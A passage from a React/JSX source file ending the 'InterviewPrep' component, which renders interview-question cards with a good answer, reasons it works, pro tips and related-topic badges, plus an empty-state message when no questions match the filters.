                                            <h4 className="font-semibold text-lg">✅ Good Answer</h4>
                                        </div>
                                        <Alert className="bg-green-50 dark:bg-green-950/20 border-green-200 dark:border-green-900">
                                            <AlertDescription className="text-sm leading-relaxed whitespace-pre-line">
                                                "{question.goodAnswer}"
                                            </AlertDescription>
                                        </Alert>
                                        <div className="space-y-2">
                                            <span className="text-sm font-medium text-green-800 dark:text-green-200">Why this answer works:</span>
                                            <ul className="space-y-1">
                                                {question.goodReasons.map((reason, idx) => (
                                                    <li key={idx} className="flex items-start gap-2 text-sm text-green-700 dark:text-green-300">
                                                        <CheckCircle2 className="h-4 w-4 mt-0.5 flex-shrink-0" />
                                                        <span>{reason}</span>
                                                    </li>
                                                ))}
                                            </ul>
                                        </div>
                                    </div>

                                    {/* Tips */}
                                    <div className="space-y-3">
                                        <div className="flex items-center gap-2">
                                            <Lightbulb className="h-5 w-5 text-amber-600" />
                                            <h4 className="font-semibold text-lg">💡 Pro Tips</h4>
                                        </div>
                                        <ul className="space-y-2">
                                            {question.tips.map((tip, idx) => (
                                                <li key={idx} className="flex items-start gap-2 text-sm p-3 bg-amber-50 dark:bg-amber-950/20 rounded-lg border border-amber-200 dark:border-amber-900">
                                                    <TrendingUp className="h-4 w-4 text-amber-600 mt-0.5 flex-shrink-0" />
                                                    <span>{tip}</span>
                                                </li>
                                            ))}
                                        </ul>
                                    </div>

                                    {/* Related Topics */}
                                    {question.relatedTopics && question.relatedTopics.length > 0 && (
                                        <div>
                                            <span className="text-sm font-medium mr-2">Related Topics:</span>
                                            <div className="inline-flex flex-wrap gap-1 mt-2">
                                                {question.relatedTopics.map((topic, idx) => (
                                                    <Badge key={idx} variant="secondary" className="text-xs">
                                                        {topic}
                                                    </Badge>
                                                ))}
                                            </div>
                                        </div>
                                    )}
                                </CardContent>
                            )}
                        </Card>
                    );
                })}
            </div>

            {filteredQuestions.length === 0 && (
                <Card>
                    <CardContent className="py-12 text-center">
                        <AlertTriangle className="h-12 w-12 mx-auto text-muted-foreground mb-4" />
                        <h3 className="text-lg font-medium mb-2">No questions found</h3>
                        <p className="text-muted-foreground">
                            Try adjusting your filters
                        </p>
                    </CardContent>
                </Card>
            )}
        </div>
    );
};

export default InterviewPrep;
